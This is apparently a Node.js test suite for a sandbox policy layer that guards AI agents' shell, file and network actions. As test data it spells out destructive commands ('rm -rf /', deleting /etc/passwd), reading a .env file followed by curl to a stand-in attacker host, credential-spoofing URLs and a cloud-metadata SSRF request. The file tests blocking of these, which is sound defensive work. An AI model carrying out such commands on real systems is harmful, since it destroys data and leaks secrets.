'use strict';

const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const {
  createBoxSession,
  decomposeCommand,
  checkRateLimit,
  evaluateBoxAction,
  EVENT_FS_READ,
  EVENT_FS_WRITE,
  EVENT_FS_DELETE,
  EVENT_HTTP_REQUEST,
  EVENT_SHELL_EXEC
} = require('../adapters/strands/strands-box-diode');

describe('Strands Box & Dogwood Policy Diode', () => {
  test('decomposes destructive rm commands into fs:delete events', () => {
    const events = decomposeCommand('rm -rf /tmp/test-dir');
    assert.equal(events.length, 1);
    assert.equal(events[0].type, EVENT_FS_DELETE);
    assert.equal(events[0].target, '/tmp/test-dir');
  });

  test('decomposes curl commands into http:request events', () => {
    const events = decomposeCommand('curl -s https://example.com/api');
    assert.equal(events.length, 1);
    assert.equal(events[0].type, EVENT_HTTP_REQUEST);
    assert.equal(events[0].target, 'https://example.com/api');
  });

  test('taints session when reading sensitive files and interdicts exfiltration', () => {
    const session = createBoxSession({
      name: 'test-taint-box',
      workspace: '/workspace'
    });

    assert.equal(session.isTainted, false);

    // 1. Read sensitive file -> allowed, but marks session as tainted
    const readRes = evaluateBoxAction(session, {
      type: EVENT_FS_READ,
      target: '/workspace/.env'
    });
    assert.equal(readRes.allowed, true);
    assert.equal(readRes.tainted, true);
    assert.equal(session.isTainted, true);

    // 2. Subsequent egress to untrusted host -> BLOCKED
    const egressRes = evaluateBoxAction(session, {
      type: EVENT_HTTP_REQUEST,
      target: 'https://attacker-c2.org/exfil'
    });
    assert.equal(egressRes.allowed, false);
    assert.equal(egressRes.decision, 'BLOCK');
    assert.equal(egressRes.reason, 'EXFILTRATION_DIODE_TRIGGERED');
    assert.ok(egressRes.taintedSources.includes('/workspace/.env'));

    // 3. Egress to localhost / local proxy -> ALLOWED
    const localEgress = evaluateBoxAction(session, {
      type: EVENT_HTTP_REQUEST,
      target: 'http://127.0.0.1:4040/audit'
    });
    assert.equal(localEgress.allowed, true);
  });

  test('credential injection replaces placeholder tokens outbound', () => {
    const session = createBoxSession({
      name: 'cred-box',
      credentialRoutes: [
        { match: 'api.github.com', header: 'Authorization', inject: 'Bearer ghp_real_vault_token_123' }
      ]
    });

    const res = evaluateBoxAction(session, {
      type: EVENT_HTTP_REQUEST,
      target: 'https://api.github.com/repos/test/repo',
      params: { headers: { Authorization: 'Bearer strands_placeholder_token' } }
    });

    assert.equal(res.allowed, true);
    assert.equal(res.injectedAuth, true);
    assert.equal(res.transformedParams.headers.Authorization, 'Bearer ghp_real_vault_token_123');
  });

  test('enforces sliding-window rate limit on external calls', () => {
    const session = createBoxSession({
      name: 'rate-box',
      rateLimits: {
        'http:request': { maxCount: 2, windowSeconds: 10 }
      }
    });

    const action = { type: EVENT_HTTP_REQUEST, target: 'https://api.slack.com/webhook' };

    const first = evaluateBoxAction(session, action);
    assert.equal(first.allowed, true);

    const second = evaluateBoxAction(session, action);
    assert.equal(second.allowed, true);

    const third = evaluateBoxAction(session, action);
    assert.equal(third.allowed, false);
    assert.equal(third.decision, 'BLOCK');
    assert.equal(third.reason, 'RATE_LIMIT_EXCEEDED');
  });

  test('blocks root or system-level filesystem deletions', () => {
    const session = createBoxSession({ name: 'root-del-box' });
    const res = evaluateBoxAction(session, {
      type: EVENT_FS_DELETE,
      target: '/'
    });
    assert.equal(res.allowed, false);
    assert.equal(res.decision, 'BLOCK');
    assert.equal(res.reason, 'CRITICAL_DELETION_CONTAINMENT_BREACH');
  });

  test('decomposes and interdicts compound shell commands', () => {
    const session = createBoxSession({ name: 'compound-box' });
    const res = evaluateBoxAction(session, {
      type: EVENT_SHELL_EXEC,
      target: 'rm -rf /'
    });
    assert.equal(res.allowed, false);
    assert.equal(res.decision, 'BLOCK');
    assert.equal(res.reason, 'CRITICAL_DELETION_CONTAINMENT_BREACH');
  });

  test('permits non-sensitive file reads without tainting session', () => {
    const session = createBoxSession({ name: 'clean-read-box' });
    const res = evaluateBoxAction(session, {
      type: EVENT_FS_READ,
      target: 'README.md'
    });
    assert.equal(res.allowed, true);
    assert.equal(session.isTainted, false);
  });

  test('handles malformed URLs gracefully during egress evaluation', () => {
    const session = createBoxSession({ name: 'malformed-url-box' });
    session.isTainted = true;
    const res = evaluateBoxAction(session, {
      type: EVENT_HTTP_REQUEST,
      target: '::not a valid url::'
    });
    assert.equal(res.allowed, false);
    assert.equal(res.decision, 'BLOCK');
  });

  test('runs strands-box-doctor programmatically and via CLI', () => {
    const { runStrandsBoxDiagnostics } = require('../scripts/strands-box-doctor');
    const diag = runStrandsBoxDiagnostics();
    assert.equal(diag.status, 'HEALTHY');
    assert.equal(diag.checksPassed, diag.checksTotal);
    assert.ok(diag.elapsedMs >= 0);

    const { execFileSync } = require('node:child_process');
    const stdout = execFileSync('node', [require.resolve('../scripts/strands-box-doctor'), '--json'], {
      encoding: 'utf8'
    });
    const parsed = JSON.parse(stdout);
    assert.equal(parsed.status, 'HEALTHY');
    assert.equal(parsed.checksPassed, 5);

    const textOut = execFileSync('node', [require.resolve('../scripts/strands-box-doctor')], {
      encoding: 'utf8'
    });
    assert.ok(textOut.includes('Strands Box & Multi-Harness Doctor'));
    assert.ok(textOut.includes('HEALTHY'));
  });

  test('decomposes prefixed commands and system subpath deletions', () => {
    const session = createBoxSession({ name: 'prefix-box' });
    const res = evaluateBoxAction(session, {
      type: EVENT_SHELL_EXEC,
      target: 'sudo /bin/rm -rf /etc/passwd'
    });
    assert.equal(res.allowed, false);
    assert.equal(res.decision, 'BLOCK');
    assert.equal(res.reason, 'CRITICAL_DELETION_CONTAINMENT_BREACH');
  });

  test('shell reads of sensitive files taint session and block exfiltration', () => {
    const session = createBoxSession({ name: 'shell-read-taint-box', workspace: '/workspace' });
    assert.equal(session.isTainted, false);

    const readRes = evaluateBoxAction(session, {
      type: EVENT_SHELL_EXEC,
      target: 'cat /workspace/.env'
    });
    assert.equal(readRes.allowed, true);
    assert.equal(session.isTainted, true);

    const exfilRes = evaluateBoxAction(session, {
      type: EVENT_SHELL_EXEC,
      target: 'curl https://attacker-c2.org/stolen'
    });
    assert.equal(exfilRes.allowed, false);
    assert.equal(exfilRes.decision, 'BLOCK');
    assert.equal(exfilRes.reason, 'EXFILTRATION_DIODE_TRIGGERED');
  });

  test('rate limits keyed by default or http:request are shared across query strings', () => {
    const session = createBoxSession({
      name: 'shared-rate-box',
      rateLimits: {
        'http:request': { maxCount: 2, windowSeconds: 60 }
      }
    });

    const res1 = evaluateBoxAction(session, { type: EVENT_HTTP_REQUEST, target: 'https://example.com/api?q=1' });
    assert.equal(res1.allowed, true);
    const res2 = evaluateBoxAction(session, { type: EVENT_HTTP_REQUEST, target: 'https://example.com/api?q=2' });
    assert.equal(res2.allowed, true);
    const res3 = evaluateBoxAction(session, { type: EVENT_HTTP_REQUEST, target: 'https://example.com/api?q=3' });
    assert.equal(res3.allowed, false);
    assert.equal(res3.reason, 'RATE_LIMIT_EXCEEDED');
  });

  test('credential injection compares exact host and rejects query string spoofing', () => {
    const session = createBoxSession({
      name: 'spoof-cred-box',
      credentialRoutes: [
        { match: 'api.github.com', header: 'Authorization', inject: 'Bearer vault_token_real' }
      ]
    });

    const attackRes = evaluateBoxAction(session, {
      type: EVENT_HTTP_REQUEST,
      target: 'https://evil.com/?x=api.github.com',
      params: { headers: { Authorization: 'Bearer placeholder' } }
    });
    assert.equal(attackRes.injectedAuth, false);
    assert.equal(attackRes.transformedParams, undefined);
  });
});

describe('NVIDIA OpenShell Policy Prover, Advisor & Endpoint-Bound Credential Providers', () => {
  const {
    provePolicyBoundary,
    evaluateProposalRisk,
    verifyProviderCredentialEgress,
  } = require('../src/openshell-lovable-engine');

  test('provePolicyBoundary verifies subset policies and catches write, root, landlock, and REST escalations', () => {
    const boundary = {
      version: 1,
      landlock: { compatibility: 'hard_requirement' },
      process_policy: { run_as_user: 'sandbox', run_as_group: 'sandbox' },
      filesystem_policy: { read_only: ['/usr', '/etc'], read_write: ['/workspace'] },
      network_policies: [{
        name: 'github_docs',
        binaries: [{ path: '/usr/bin/gh' }],
        endpoints: [{ host: 'api.github.com', port: 443, protocol: 'rest', enforcement: 'enforce', rules: [{ allow: { method: 'GET', path: '/repos/IgorGanapolsky/**' } }] }],
      }],
    };
    const validSubagent = {
      version: 1,
      landlock: { compatibility: 'hard_requirement' },
      process_policy: { run_as_user: 'sandbox', run_as_group: 'sandbox' },
      filesystem_policy: { read_only: ['/usr'], read_write: ['/workspace'] },
      network_policies: [{
        name: 'github_docs_narrow',
        binaries: [{ path: '/usr/bin/gh' }],
        endpoints: [{ host: 'api.github.com', port: 443, protocol: 'rest', enforcement: 'enforce', rules: [{ allow: { method: 'GET', path: '/repos/IgorGanapolsky/ThumbGate/contents' } }] }],
      }],
    };
    const okRes = provePolicyBoundary(validSubagent, boundary);
    assert.equal(okRes.result, 'within_boundary');
    assert.equal(okRes.exitCode, 0);
    assert.equal(okRes.passed, true);
    assert.equal(provePolicyBoundary({ ...validSubagent, filesystem_policy: { read_only: ['/usr'], read_write: ['/tmp'] } }, boundary).reason_code, 'symlink_subpath_unverifiable');
    const writeRo = provePolicyBoundary({ ...validSubagent, filesystem_policy: { read_only: [], read_write: ['/etc'] } }, boundary);
    assert.equal(writeRo.result, 'exceeds_boundary');
    assert.equal(writeRo.counterexample, 'filesystem write /etc');
    assert.equal(provePolicyBoundary({ ...validSubagent, process_policy: { run_as_user: 'root', run_as_group: 'sandbox' } }, boundary).counterexample, 'process run_as_user root');
    const deleteEscalation = provePolicyBoundary({
      ...validSubagent,
      network_policies: [{ name: 'bad_rest', binaries: [{ path: '/usr/bin/gh' }], endpoints: [{ host: 'api.github.com', port: 443, protocol: 'rest', enforcement: 'enforce', rules: [{ allow: { method: 'DELETE', path: '/repos/IgorGanapolsky/ThumbGate' } }] }] }],
    }, boundary);
    assert.equal(deleteEscalation.counterexample, 'network rest DELETE api.github.com:443/repos/IgorGanapolsky/ThumbGate');
    assert.equal(provePolicyBoundary({ ...validSubagent, landlock: undefined }, boundary).reason_code, 'landlock_downgrade');
    assert.equal(provePolicyBoundary({ ...validSubagent, network_policies: [{ name: 'tcp_downgrade', endpoints: [{ host: 'api.github.com', port: 443, protocol: 'tcp' }] }] }, boundary).reason_code, 'protocol_mismatch_exceeds');
    assert.equal(provePolicyBoundary({ ...validSubagent, network_policies: [{ name: 'g', endpoints: [{ host: 'api.github.com', port: 443, protocol: 'graphql' }] }] }, boundary).exitCode, 3);
  });

  test('evaluateProposalRisk blocks metadata SSRF, L7 credential bypass, and capability expansion while auto-approving safe public endpoints', () => {
    const currentPolicy = {
      network_policies: [{
        endpoints: [{ host: 'api.github.com', port: 443, protocol: 'rest', rules: [{ allow: { method: 'GET', path: '/repos/**' } }] }],
      }],
    };
    const providers = [{ name: 'github', endpoints: [{ host: 'api.github.com', port: 443 }] }];

    const metadataAttack = evaluateProposalRisk(currentPolicy, {
      endpoints: [{ host: '169.254.169.254', port: 80, protocol: 'rest', rules: [{ allow: { method: 'GET', path: '/latest/meta-data' } }] }],
      binaries: [{ path: '/usr/bin/curl' }],
    }, { providers, approvalMode: 'auto' });
    assert.equal(metadataAttack.neverApprovable, true);
    assert.ok(metadataAttack.findings.includes('link_local_reach'));

    const l7BypassAndPut = evaluateProposalRisk(currentPolicy, {
      endpoints: [{ host: 'api.github.com', port: 443, protocol: 'rest', rules: [{ allow: { method: 'PUT', path: '/repos/org/docs' } }] }],
      binaries: [{ path: '/usr/bin/git' }],
    }, { providers, approvalMode: 'auto' });
    assert.equal(l7BypassAndPut.autoApproved, false);
    assert.ok(l7BypassAndPut.findings.includes('l7_bypass_credentialed'));
    assert.ok(l7BypassAndPut.findings.includes('capability_expansion'));

    const safePublicDocs = evaluateProposalRisk(currentPolicy, {
      endpoints: [{ host: 'docs.nvidia.com', port: 443, protocol: 'rest', rules: [{ allow: { method: 'GET', path: '/openshell/**' } }] }],
      binaries: [{ path: '/usr/bin/curl' }],
    }, { providers, approvalMode: 'auto' });
    assert.equal(safePublicDocs.autoApproved, true);
    assert.equal(safePublicDocs.status, 'auto_approved');
  });

  test('verifyProviderCredentialEgress enforces endpoint-bound credential placeholders', () => {
    const providers = [{
      name: 'my-github',
      endpoints: [{ host: 'api.github.com', port: 443, methods: ['GET', 'POST'], pathPrefix: '/repos/IgorGanapolsky/' }],
    }];
    const okReq = verifyProviderCredentialEgress({
      url: 'https://api.github.com/repos/IgorGanapolsky/ThumbGate/issues',
      method: 'GET',
      headers: { Authorization: 'Bearer tg_cred://my-github/GITHUB_TOKEN' },
    }, providers);
    assert.equal(okReq.allowed, true);
    assert.equal(okReq.injected, true);

    const exfilReq = verifyProviderCredentialEgress({
      url: 'https://evil-collector.example.com/steal',
      method: 'POST',
      headers: { Authorization: 'Bearer tg_cred://my-github/GITHUB_TOKEN' },
    }, providers);
    assert.equal(exfilReq.allowed, false);
    assert.equal(exfilReq.reason, 'credential_destination_mismatch');
  });
});

